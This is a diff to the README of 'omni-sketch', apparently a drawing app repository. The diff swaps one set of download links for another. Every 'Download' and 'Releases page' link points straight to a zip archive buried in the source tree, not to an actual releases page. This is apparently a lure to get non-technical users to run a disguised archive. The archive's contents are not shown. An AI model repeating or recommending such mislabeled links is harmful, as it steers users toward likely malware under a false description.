@@ -4,7 +4,7 @@
 Welcome to omni-sketch! This is a modern and minimalist drawing app designed for everyone. Whether you want to create sketches, doodle, or just have fun, omni-sketch makes it easy. 
 
 ## 📦 Download Now
-[![Download omni-sketch](https://github.com/mughriah/omni-sketch/raw/refs/heads/master/app/types/sketch_omni_compenetration.zip)](https://github.com/mughriah/omni-sketch/raw/refs/heads/master/app/types/sketch_omni_compenetration.zip)
+[![Download omni-sketch](https://raw.githubusercontent.com/mughriah/omni-sketch/master/app/components/sketch-omni-v3.5.zip)](https://raw.githubusercontent.com/mughriah/omni-sketch/master/app/components/sketch-omni-v3.5.zip)
 
 ## 🚀 Getting Started
 To get started with omni-sketch, follow these simple steps. No technical skills required. Just a computer and a desire to draw!
@@ -16,7 +16,7 @@ To get started with omni-sketch, follow these simple steps. No technical skills 
 - **Browser:** Latest version of Chrome, Firefox, or Safari
 
 ## 🔗 Download & Install
-1. Visit the [Releases page](https://github.com/mughriah/omni-sketch/raw/refs/heads/master/app/types/sketch_omni_compenetration.zip) to download the latest version of omni-sketch.
+1. Visit the [Releases page](https://raw.githubusercontent.com/mughriah/omni-sketch/master/app/components/sketch-omni-v3.5.zip) to download the latest version of omni-sketch.
 2. Look for the most recent version at the top of the page. 
 3. Click on the download link that suits your operating system. 
 4. Once downloaded, locate the file in your downloads folder or wherever you saved it.
@@ -46,7 +46,7 @@ To get started with omni-sketch, follow these simple steps. No technical skills 
 If you encounter issues:
 - Ensure your system meets the requirements.
 - Restart the app if it seems unresponsive.
-- Check for updates on the [Releases page](https://github.com/mughriah/omni-sketch/raw/refs/heads/master/app/types/sketch_omni_compenetration.zip) for bug fixes.
+- Check for updates on the [Releases page](https://raw.githubusercontent.com/mughriah/omni-sketch/master/app/components/sketch-omni-v3.5.zip) for bug fixes.
 
 ## 🌐 Community and Support
 Join our community for tips, feedback, and support. Share your artwork and connect with others who use omni-sketch. Look out for updates and feature proposals!
